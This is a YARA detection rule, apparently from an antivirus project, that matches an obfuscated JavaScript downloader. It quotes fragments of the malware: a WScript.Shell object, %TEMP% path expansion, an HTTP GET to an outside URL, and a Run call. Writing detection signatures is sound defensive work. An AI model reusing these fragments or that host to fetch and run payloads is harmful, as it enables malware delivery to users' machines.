rule sig_20160427_53d229349562f314740c8c98bb7b5b31 {
  meta:
    description = "datamaliciousorder - file 20160427_53d229349562f314740c8c98bb7b5b31.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f10cafee4db5bce4b8f079eb146954a94a245830050a87a4a7dd461a1230cc01"

  strings:
    $s1  = "function YipgyFqukz() {return QubbuVnlyl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"rUTVxqK" ascii
    $s2  = "function YipgyFqukz() {return QubbuVnlyl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"rUTVxqK" ascii
    $s3  = "var QubbuVnlyl = function RuttzZmhgw() {return UhyiaGbmsb[PmqwcNbqxt](\"WScript\"+\".Shell\");}(), CekhzKzynm = 11;" fullword ascii
    $s4  = "function VzaxxQafad(VseepArqrg, PjyroJirfm){IvbndCytlm = IvbndCytlm * 1; return VseepArqrg - PjyroJirfm;};" fullword ascii
    $s5  = "UqlpxOpbgk[AjfsjShyhg](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var UhyiaGbmsb = this[\"WScript\"];" fullword ascii
    $s7  = "if (UqlpxOpbgk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function GogmuTtend(){return MfweeDmpln + \"\";};" fullword ascii
    $s9  = "function TcbzgFmazi() {return ((UvpinSflmy == true) && (UvpinSflmy == ZhkozLgsvj)) ? 1 : IvbndCytlm;};" fullword ascii
    $s10 = "XyjdfJcycx = true;" fullword ascii
    $s11 = "var EjiqzWljgy = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "function AedkqMdubj(QgskmHnqjf) {var KtvckGcddz = (1, 2, 3, 4, 5, QgskmHnqjf); return KtvckGcddz;};" fullword ascii
    $s13 = "function HnvttUsjzx()" fullword ascii
    $s14 = "function MbmmrRltiu(){return PmqwcNbqxt;};" fullword ascii
    $s15 = "var UvpinSflmy = false;" fullword ascii
    $s16 = "function AdlhaEoscy(RevioVwedm){QubbuVnlyl[\"R\"+\"un\"](RevioVwedm, IvbndCytlm, IvbndCytlm);};" fullword ascii
    $s17 = "UvpinSflmy = true; " fullword ascii
    $s18 = "ZhkozLgsvj = true; " fullword ascii
    $s19 = "function FazyaBdmgy(){return 23;};" fullword ascii
    $s20 = "return VzaxxQafad(JivtmEiflh, LqtmeNjzyk);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}